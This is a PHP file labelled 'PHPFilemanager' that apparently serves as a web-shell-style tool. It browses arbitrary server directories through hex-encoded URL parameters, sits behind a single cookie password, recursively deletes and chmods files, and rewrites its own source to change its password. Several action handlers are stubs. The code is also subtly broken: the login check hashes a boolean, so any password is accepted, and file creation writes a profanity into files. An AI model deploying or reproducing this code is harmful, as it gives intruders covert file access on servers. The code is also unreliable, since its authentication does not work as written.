<?php
/**
 *
 */
class FileSystem
{
	public $path;

	protected $cookie;
	protected $password;
	protected $post;
	protected $get;
	protected $result;
	protected $filename;
	protected $dir;
	protected $file;
	protected $cwd;
	protected $open;
	protected $expired = [
		60, // 1 second
		60*60, // 1 minute
		60*60*1, // 1 hour
		60*60*24, // 1 day
		60*60*24*30, // 1 month
		60*60*24*30*12 // 1 year
	];
	
	function __construct()
	{
		$this->path = str_replace("\\", "/", getcwd());
		$this->post = $_POST;
		$this->get = $_GET;
		$this->cookie = $_COOKIE;
	}

	/*
	* Function Login
	* @param string sha1(md5())
	*/

	public function auth($password)
	{
		$this->password = $password;
		return $this;
	}

	public function pageLogin()
	{
		?>
		<form method="post">
			<input type="password" name="password">
		</form>
		<?php
	}

	public function login()
	{
		if (isset($this->password) && (trim($this->password) != "")) {
			if (isset($this->post["password"])) {
				if (sha1(md5($this->post["password"]) === $this->password)) {
					setcookie("password", $this->password, time() + $this->expired[4], "/");
					header("Location: {$_SERVER['PHP_SELF']}");
				} else {
					echo "wrong password !";
				}
			}
			if (!isset($this->cookie["password"]) || ((isset($this->cookie["password"]) && ($this->cookie["password"] != $this->password)))) {
				$this->pageLogin();
				die();
			}
		}
	}

	public function logout()
	{
		if (isset($this->cookie["password"])) {
			setcookie("password", "", time() - 1);
			header("Location: {$_SERVER['PHP_SELF']}");
		}
	}

	/*
		end Function Login
	*/


	/*
		Function listFiles
	*/

	public function list($type)
	{
		$this->result = [];
		foreach (scandir($this->path) as $key => $value) {
			$filename["path"] = $this->path . DIRECTORY_SEPARATOR . $value;
			$filename =
				[
					$filename["path"], // full path
					$value, // single file
					(is_dir($value)) ? null : $this->formatSize(filesize($filename["path"])), // get format size
					date("d/m/Y - H:i:s", $this->ftime($filename["path"])), // get filetime
					$this->writeable($value, $this->get($filename["path"])->perms()), // get permission
					$this->get($filename["path"])->modefile(), // get file mode

					[
						"?x=".self::strtohex($this->path)."&e=".self::strtohex($filename["path"])."", // edit

						"?x=".self::strtohex($this->path)."&r=".self::strtohex($filename["path"])."", // rename

						"?x=".self::strtohex($this->path)."&d=".self::strtohex($filename["path"])."", // delete

						"?x=".self::strtohex($this->path)."&c=".self::strtohex($filename["path"])."", // change mode

						"?x=".self::strtohex($this->path)."&dl=".self::strtohex($filename["path"])."" // download
					] // action

				];

			switch ($type) {
				case 'all':
					if (is_dir($filename[0]) || $value === "." || $value === "..") {
						$this->result[] = $filename;
						continue 2;
					}
					break;
				case 'dir':
					if (!is_dir($filename[0]) || $value === "." || $value === "..") continue 2;
					break;
				
				case 'file':
					if (!is_file($filename[0])) continue 2;
					break;
			}
			$this->result[] = $filename;
		} return $this->result;
	}

	public function dirs()
	{
		return $this->list("dir");
	}

	public function files()
	{
		return $this->list("file");
	}

	/*
		end Function listFiles
	*/


	/*
		end Function hex and unhex
	*/

	public static function strtohex($string)
	{
		$str = "";
        for ($i=0; $i < strlen($string) ; $i++) { 
            $str .= dechex(ord($string[$i]));
        } return $str;
	}

	public static function hextostr($hex)
	{
		$unhex = "";
        for ($i=0; $i < strlen($hex)-1 ; $i+=2) { 
            $unhex .= chr(hexdec($hex[$i].$hex[$i+1]));
        } return $unhex;
	}

	/*
		end Function hex and unhex
	*/


	/*
		Function cd
	*/

	public static function cd($directory)
	{
		return chdir($directory);
	}

	/*
		Function cd
	*/

	/*
		Function pwd
	*/

	public function pwd()
	{
		$path = preg_split("/(\\\|\/)/", $this->path);
		foreach ($path as $key => $value) {
			if ($value == "" && $key = 0) {
				print("<a href='?x=2f'>2f</a>");
			}
			if ($value == "") continue;
			print("<a href='?x=");
			for ($i=0; $i <= $key ; $i++) { 
				print(self::strtohex($path[$i]));
				if ($i != $key) {
					print("2f");
				}
			} print("'>{$value}</a>/");
		}
	}

	/*
		Function pwd
	*/

	/*
		Function writeable
	*/

	public function writeable($filename, $perms)
	{
		return (is_writable($filename)) ? "<font color='green'>{$perms}</font>" : "<font color='red'>{$perms}</font>";
	}

	/*
		end Function writeable
	*/


	/*
		Function htmlsafe
	*/

	public function htmlsafe($value)
	{
		return htmlspecialchars($value);
	}

	/*
		end Function htmlsafe
	*/

	/*
		Function path
	*/

	public function path($path)
	{
		$this->cwd = $path;
		return $this;
	}

	/*
		end Function path
	*/

	/*
		Function getExtension
	*/

	public function getExtension($filename)
	{
		return strtolower(pathinfo($filename, PATHINFO_EXTENSION));
	}

	/*
		end Function getExtension
	*/

	/*
		Function ftime
	*/

	public function ftime($filename)
	{
		return filemtime($filename);
	}

	/*
		end Function ftime
	*/

	/*
		Function action
	*/

	public function get($filename)
	{
		$this->filename = $this->htmlsafe($filename);
		return $this;
	}

	public function open($mode)
	{
		$this->open = fopen($this->filename, $mode);
		return $this;
	}

	public function read()
	{
		return htmlspecialchars(file_get_contents($this->filename));
	}

	public function write($data)
	{
		fwrite($this->open, $data);
		$ftime = $this->ftime($this->filename); 
		if ($ftime === false) return false;
		return touch($this->filename, $ftime);
	}

	public function chname($newname)
	{
		return (!empty($this->filename)) ? rename($this->filename, $this->path . DIRECTORY_SEPARATOR . $newname) : false;
	}

	public function chmod($mode)
	{
		return (!empty($this->filename)) ? chmod($this->filename, $mode) : false;
	}

	/*
		end Function action
	*/

	public function perms()
	{
		$perms = fileperms($this->filename);

		switch ($perms & 0xF000) {
		    case 0xC000: // socket
		        $info = 's';
		        break;
		    case 0xA000: // symbolic link
		        $info = 'l';
		        break;
		    case 0x8000: // regular
		        $info = 'r';
		        break;
		    case 0x6000: // block special
		        $info = 'b';
		        break;
		    case 0x4000: // directory
		        $info = 'd';
		        break;
		    case 0x2000: // character special
		        $info = 'c';
		        break;
		    case 0x1000: // FIFO pipe
		        $info = 'p';
		        break;
		    default: // unknown
		        $info = 'u';
		}

		// Owner
		$info .= (($perms & 0x0100) ? 'r' : '-');
		$info .= (($perms & 0x0080) ? 'w' : '-');
		$info .= (($perms & 0x0040) ?
		            (($perms & 0x0800) ? 's' : 'x' ) :
		            (($perms & 0x0800) ? 'S' : '-'));

		// Group
		$info .= (($perms & 0x0020) ? 'r' : '-');
		$info .= (($perms & 0x0010) ? 'w' : '-');
		$info .= (($perms & 0x0008) ?
		            (($perms & 0x0400) ? 's' : 'x' ) :
		            (($perms & 0x0400) ? 'S' : '-'));

		// World
		$info .= (($perms & 0x0004) ? 'r' : '-');
		$info .= (($perms & 0x0002) ? 'w' : '-');
		$info .= (($perms & 0x0001) ?
		            (($perms & 0x0200) ? 't' : 'x' ) :
		            (($perms & 0x0200) ? 'T' : '-'));

		return $info;
	}

	/*
		Function formatSize
	*/

	public function formatSize($bytes)
	{
		$kb = 1024;
		$mb = $kb * 1024;
		$gb = $mb * 1024;
		$tb = $gb * 1024;

		if (($bytes >= 0) && ($bytes < $kb)) {
			return $bytes . ' B';
		} elseif (($bytes >= $kb) && ($bytes < $mb)) {
			return ceil($bytes / $kb) . ' KB';
		} elseif (($bytes >= $mb) && ($bytes < $gb)) {
			return ceil($bytes / $mb) . ' MB';
		} elseif (($bytes >= $gb) && ($bytes < $tb)) {
			return ceil($bytes / $gb) . ' GB';
		} elseif ($bytes >= $tb) {
			return ceil($bytes / $tb) . ' TB';
		} else {
			return $bytes . ' B';
		}

	}

	/*
		end Function formatSize
	*/

	/*
		Function modefile
	*/

	public function modefile()
	{
		return substr(sprintf("%o", fileperms($this->filename)), - 4);
	}

	/*
		Function modefile
	*/

	/*
		Function Delete
	*/

	public function delete($filename)
	{
		if (is_dir($filename)) {
			foreach (scandir($filename) as $key => $value) {
				if ($value != "." && $value != "..") {
					if (is_dir($filename . DIRECTORY_SEPARATOR . $value)) {
						$this->delete($filename . DIRECTORY_SEPARATOR . $value);
					} else {
						unlink($filename . DIRECTORY_SEPARATOR . $value);
					}
				}
			} if (@rmdir($filename)) {
				return true;
			} else {
				return false;
			}
		} else {
			if (unlink($filename)) {
				return true;
			} else {
				return false;
			}
		}
	}

	/*
		end Function Delete
	*/

	/*
		Function make file & folder
	*/

	public function make($filename)
	{
		$this->filename = $this->htmlsafe($filename);
		return $this;
	}

	public function folder()
	{
		return mkdir($this->cwd . DIRECTORY_SEPARATOR . $this->filename, 0777);
	}

	public function file($data)
	{
		foreach ($this->filename as $key => $value) {
			$separate = explode(",", $this->filename[$key]);
			foreach ($separate as $id => $file) {
				$this->get($file)->open("w")->write("jancok");
			}
		}
	}

	/*
		end Function make file & dir
	*/

	/*
		Function changepassword
	*/

	public function changepassword($string)
	{
		$newpassword = sha1(md5($string));
		$newpassword = "\$password = \"".$newpassword."\";";
		$option = file_get_contents($_SERVER['SCRIPT_FILENAME']);
		$option = preg_replace("/\\\$password\ *=\ *[\'\"]*([a-fA-F0-9]*)[\'\"];*/is", $newpassword, $option);
		return file_put_contents($_SERVER['SCRIPT_FILENAME'], $option);
	}

	/*
		end Function changepassword
	*/

}

if (isset($_GET['x'])) {
	FileSystem::cd(FileSystem::hextostr($_GET['x']));
}
$FileSystem = new FileSystem;
?>
<!doctype html>
<html lang="en">
  	<head>
    	<meta charset="utf-8">
    	<meta name="viewport" content="width=device-width, initial-scale=1">
    	<link href='https://fonts.googleapis.com/css?family=Open+Sans:400,300,600' rel='stylesheet' type='text/css'>
  		<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css" rel="stylesheet">
  		<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css"/>
  		<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/tailwindcss/1.1.4/tailwind.min.css">
    	<title>Hello, world!</title>
  	</head>
  	<style type="text/css">
  		*,
  		*:before,
  		*:after {
  			margin: 0;
  			padding: 0;
  			box-sizing: border-box;
  		}

  		body, html {
  			height: 100%;
  			background-color: #EEEEEE;
  			/*overflow: hidden;*/
  		}

  		.container {
  			width: 100%;
  			height: 100%;
  		}

  		.tutorial {
  			width: 80%;
  			margin: 5% auto 0 auto;
  			box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
  			background-color: #f9f9f9;
  			max-width: 800px;
  			border-radius:10px;
  		}
  		.tutorial .slider {
  			width: 100%;
  			max-height: 100%;
  			overflow: auto;
  			padding-right: 15px;
  			padding-left: 15px;
  			/*background-color: #F03861;*/
  		}
  		.tutorial .information {
  			width: 100%;
  			padding: 20px 50px;
  			margin-bottom: 30px;
  			font-family: "Open Sans", sans-serif;
  		}
  		.tutorial .information h1 {
  			color: #333;
  			font-size: 1.5rem;
  			padding: 0px 10px;
  			border-left: 3px solid #F03861;
  		}
  		.tutorial .information h3 {
  			color: #e0e0e0;
  			font-size: 1rem;
  			font-weight: 300;
  			padding: 0px 10px;
  			border-left: 3px solid #F03861;
  		}
  		.tutorial .information p {
  			padding: 10px 0px;
  		}
  		.tutorial ul {
  			font-size: 0;
  			list-style-type: none;
  		}
  		.tutorial ul li {
  			font-family: "Open Sans", sans-serif;
  			font-size: 1rem;
  			font-weight: 400;
  			color: #333;
  			display: inline-block;
  			padding: 15px;
  			position: relative;
  		}
  		.tutorial ul li:last-child {
  			float: right;
  		}
  		.tutorial ul li ul {
  			display: none;
  		}
  		.tutorial ul li:hover {
  			cursor: pointer;
  			background-color: #f2f2f2;
  		}
  		.tutorial ul li:hover ul {
  			display: block;
  			margin-top: 15px;
  			width: 200px;
  			left: 0;
  			position: absolute;
  		}
  		.tutorial ul li:hover ul li {
  			display: block;
  			background-color: #e7e7e7;
  		}
  		.tutorial ul li:hover ul li span {
  			float: right;
  			color: #f9f9f9;
  			background-color: #F03861;
  			padding: 2px 5px;
  			text-align: center;
  			font-size: 0.8rem;
  			border-radius: 3px;
  		}
  		.tutorial ul li:hover ul li:hover {
  			background-color: #e0e0e0;
  		}
  		.tutorial ul li:hover ul li:hover span {
  			background-color: #ee204e;
  		}

  		.wrapper {
  			max-width: 1200px;
  			margin: auto;
  		}

  		strong {
  			font-weight: 600;
  		}

  		hr {
  			border: none;
  			height: 1px;
  			background-color: rgba(51, 153, 204, 0.2);
  		}

  		.img-placeholder {
  			background-image: url("http://placehold.it/200x100/CC99CC/ffffff&text=Feature");
  			background-size: cover;
  			min-height: 100px;
  			min-width: 100px;
  		}

  		/*Basic Grid Styles*/
  		.Grid {
  			display: flex;
  			flex-flow: row;
  			flex-wrap: wrap;
  		}

  		.u-textCenter {
  			text-align: center;
  		}

  		.Grid-cell {
  			flex: 1;
  		}

  		.Demo {
  			padding: .8em 1em 0;
  			margin-bottom: 1em;
  			background: rgba(51, 153, 204, 0.2);
  			transition: background-color 0.3s ease;
  			border: 1px solid #33cccc;
  			border-radius: 3px;
  		}
  		.Demo:after {
  			content: "";
  			display: block;
  			margin-top: .8em;
  			height: 1px;
  		}
  		.Demo:hover {
  			background: rgba(51, 153, 204, 0.6);
  		}

  		.Demo.Holly {
  			background: rgba(102, 51, 255, 0.1);
  		}
  		.Demo.Holly:hover {
  			background: rgba(102, 51, 255, 0.25);
  		}

  		/* With gutters*/
  		.Grid--gutters {
  			margin-left: -1em;
  		}
  		.Grid--gutters .Grid-cell {
  			padding-left: 1em;
  		}
  		.Grid--gutters .Grid--nested .Grid-cell:first-of-type .Demo {
  			margin-right: 1em;
  		}

  		/* Justify per row*/
  		.Grid--right {
  			justify-content: flex-end;
  		}

  		.Grid--center {
  			justify-content: center;
  		}

  		/* Alignment per row */
  		.Grid--top {
  			align-items: flex-start;
  		}

  		.Grid--bottom {
  			align-items: flex-end;
  		}

  		.Grid--center {
  			align-items: center;
  		}

  		/* Alignment per cell */
  		.Grid-cell--top {
  			align-self: flex-start;
  		}

  		.Grid-cell--bottom {
  			align-self: flex-end;
  		}

  		.Grid-cell--center {
  			align-self: center;
  		}

  		.navigation {
  			list-style: none;
  			/*background: deepskyblue;*/
  			background: rgba(102, 51, 255, 0.1);
  			margin: 0 0 1em;
  			border: 1px solid #33cccc;
  			border-radius: 3px;
  			display: flex;
  			-webkit-flex-flow: row wrap;
  			justify-content: flex-end;
  		}
  		.navigation a {
  			text-decoration: none;
  			display: block;
  			padding: 1em;
  			color: #333;
  		}
  		.navigation a:hover {
  			background: rgba(64, 0, 255, 0.1);
  			border-radius: 3px;
  		}
  		.navigation:hover {
  			background: rgba(102, 51, 255, 0.25);
  		}

  		@media all and (max-width: 800px) {
  			.navigation {
  				justify-content: space-around;
  			}
  		}
  		@media all and (max-width: 600px) {
  			.navigation {
  				-webkit-flex-flow: column wrap;
  				flex-flow: column wrap;
  				padding: 0;
  			}
  			.navigation a {
  				text-align: center;
  				padding: 10px;
  				border-top: 1px solid rgba(255, 255, 255, 0.3);
  				border-bottom: 1px solid rgba(0, 0, 0, 0.1);
  			}
  			.navigation li:last-of-type a {
  				border-bottom: none;
  			}
  		}
  		/*===========================================*/
  		/* Base classes for all media - Mobile first */
  		.Grid--cols-2 > .Grid-cell {
  			flex: 0 0 100%;
  		}

  		.Grid--cols-3 > .Grid-cell {
  			flex: 0 0 100%;
  		}

  		.Grid--cols-4 > .Grid-cell {
  			flex: 0 0 100%;
  		}

  		.Grid--cols-6 > .Grid-cell {
  			flex: 0 0 calc(50% - 1em);
  		}

  		.Grid--cols-12 > .Grid-cell {
  			flex: 0 0 calc(33.3333% - 1em);
  		}

  		.Grid--holly-grail .aside, .Grid--holly-grail .main {
  			flex: 1 100%;
  		}

  		/* One of -- columns*/
  		.Grid--1of2 > .Grid-cell,
  		.Grid--1of4 > .Grid-cell:first-of-type,
  		.Grid--1of3 > .Grid-cell:first-of-type {
  			flex: 0 0 100%;
  		}

  		.Grid--1of6 > .Grid-cell:first-of-type {
  			flex: 0 0 50%;
  		}

  		.Grid--fit > .Grid-cell {
  			flex: 1;
  		}

  		.Grid--full > .Grid-cell {
  			flex: 0 0 100%;
  		}

  		/* Tablet (medium) screens */
  		@media (min-width: 30em) {
  			.Grid--cols-4 > .Grid-cell {
  				flex: 0 0 calc(50% - 1em);
  			}

  			.Grid--cols-6 > .Grid-cell {
  				flex: 0 0 calc(33.3333% - 1em);
  			}

  			.Grid--cols-12 > .Grid-cell {
  				flex: 0 0 calc(16.6666% - 1em);
  			}

  			.Grid--holly-grail .aside {
  				flex: 1 calc(25% - 1em);
  			}

  			.Grid--1of2 > .Grid-cell {
  				flex: 0 0 50%;
  			}

  			.Grid--1of6 > .Grid-cell:first-of-type {
  				flex: 0 0 30%;
  			}

  			.Grid--1of4 > .Grid-cell:first-of-type {
  				flex: 0 0 50%;
  			}

  			.Grid--1of3 > .Grid-cell:first-of-type {
  				flex: 0 0 100%;
  			}
  		}
  		/* Large screens */
  		@media (min-width: 48em) {
  			.Grid--cols-2 > .Grid-cell,
  			.Grid--cols-3 > .Grid-cell,
  			.Grid--cols-4 > .Grid-cell,
  			.Grid--cols-6 > .Grid-cell,
  			.Grid--cols-12 > .Grid-cell {
  				flex: 1;
  			}

  			.Grid--holly-grail .main {
  				flex: 2;
  			}
  			.Grid--holly-grail .aside {
  				flex: 1;
  			}
  			.Grid--holly-grail .aside-1 {
  				order: 1;
  			}
  			.Grid--holly-grail .main {
  				order: 2;
  			}
  			.Grid--holly-grail .aside-2 {
  				order: 3;
  			}

  			.Grid--1of2 > .Grid-cell {
  				flex: 0 0 50%;
  			}

  			.Grid--1of6 > .Grid-cell:first-of-type {
  				flex: 0 0 16.6666%;
  			}

  			.Grid--1of4 > .Grid-cell:first-of-type {
  				flex: 0 0 25%;
  			}

  			.Grid--1of3 > .Grid-cell:first-of-type {
  				flex: 0 0 30%;
  			}

  			.Grid--gutters.Grid--nested .Grid-cell:first-of-type .Demo {
  				margin-right: 0;
  			}
  		}
  		.content-1of1::before {
  			content: "1";
  		}

  		.content-1of2::before {
  			content: "1/2";
  		}

  		.content-1of3::before {
  			content: "1/3";
  		}

  		.content-1of4::before {
  			content: "1/4";
  		}

  		.content-1of6::before {
  			content: "1/6";
  		}

  		.content-1of12::before {
  			content: "1/12";
  		}


  		#display {
  			padding-bottom: 10px;
  			width: auto;
  			height: auto;
  			font-weight: bold;
  			color: white;
  			/* create border around text */
  			text-shadow: 2px 0 0 #000, -2px 0 0 #000, 0 2px 0 #000, 0 -2px 0 #000, 1px 1px #000, -1px -1px 0 #000, 1px -1px 0 #000, -1px 1px 0 #000;
  		}
  	</style>
  	<body>
  		<div class="container">
  			<div class="tutorial">
  				<ul>
  					<li><h3>PHPFilemanager</h3></li>
  					<li></li>
  				</ul>
  				<div class="slider">
  					<?php
  					if (isset($_GET['e'])) {
  						$filename = FileSystem::hextostr($_GET['e']);
  						print("edit ".$filename);
  						exit();
  					}

  					if (isset($_GET['r'])) {
  						$filename = FileSystem::hextostr($_GET['r']);
  						print("rename ".$filename);
  						exit();
  					}

  					if (isset($_GET['d'])) {
  						$filename = FileSystem::hextostr($_GET['d']);
  						print("delete ".$filename);
  						exit();
  					}

  					if (isset($_GET['c'])) {
  						$filename = FileSystem::hextostr($_GET['c']);
  						print("chmode ".$filename);
  						exit();
  					}
  					if (isset($_GET['dl'])) {
  						$filename = FileSystem::hextostr($_GET['dl']);
  						print("download ".$filename);
  						exit();
  					}

  					foreach ($FileSystem->dirs() as $key => $value) { ?>
  						<div class="Grid Grid--full">
  							<div class="Grid-cell">
  								<div class="Grid Grid--gutters Grid--cols-3">
  									<div class="Grid-cell">
  										<a href="?x=<?= $FileSystem->strtohex($value[0]) ?>"><?= $value[1] ?></a>
  									</div>
  									<div class="Grid-cell"><?= $value[2] ?></div>
  									<div class="Grid-cell"><?= $value[3] ?></div>
  									<div class="Grid-cell"><?= $value[4] ?></div>
  								</div>
  							</div>
  						</div>
  						<!-- <a href="<?= $value[6][1] ?>">rename</a>
  							<a href="<?= $value[6][2] ?>">delete</a> -->
  					<?php }

  					foreach ($FileSystem->files() as $key => $value) { ?>
  						<div class="Grid Grid--full">
  							<div class="Grid-cell">
  								<div class="Grid Grid--gutters Grid--cols-3">
  									<div class="Grid-cell">
  										<?= $value[1] ?>
  									</div>
  									<div class="Grid-cell"><?= $value[2] ?></div>
  									<div class="Grid-cell"><?= $value[3] ?></div>
  									<div class="Grid-cell"><?= $value[4] ?></div>
  								</div>
  							</div>
  						</div>
  						
  						<!-- <a href="<?= $value[6][0] ?>">edit</a>
  						<a href="<?= $value[6][1] ?>">rename</a>
  						<a href="<?= $value[6][2] ?>">delete</a>
  						<a href="<?= $value[6][3] ?>">chmode</a>
  						<a href="<?= $value[6][4] ?>">download</a> -->
  					<?php }
  					?>
  				</div>
  				<div class="information">
  					<div id="display"></div>
  				</div>
  			</div>
  		</div>
  		<script src="https://cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js" type="text/javascript"></script>
  		<script type="text/javascript">
  			var quoteArray = [
  			'"You have to learn the rules of the game. And then you have to play better than anyone else." -Albert Einstein',
  			'"The secret of getting ahead is getting started." -Mark Twain', 
  			'"If you can dream it, you can do it." -Walt Disney', 
  			'"Hi." -Ryan Spoone'
  			];


  			display = document.getElementById('display');

  			var currentElement;


  			function shuffle(array) {
  				var currentIndex = array.length,
  				temporaryValue, randomIndex;

  				
  				while (0 !== currentIndex) {
  					randomIndex = Math.floor(Math.random() * currentIndex);
  					currentIndex -= 1;
  					temporaryValue = array[currentIndex];
  					array[currentIndex] = array[randomIndex];
  					array[randomIndex] = temporaryValue;
  				}

  				return array;
  			}
  			function updateDisplay() {
  				var randomElement = quoteArray[Math.floor(Math.random() * quoteArray.length)];
  				if (randomElement != currentElement) {
  					$("#display").fadeOut("slow", function() {
  						display.innerHTML = randomElement;
  						$("#display").fadeIn("slow");
  					});
  					currentElement = randomElement;
  				} else {
  					updateDisplay();
  				}
  			}
  			updateDisplay();
  			setInterval(function() {
  				updateDisplay();
  			}, 3000);
  		</script>
  		<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
  </body>
</html>
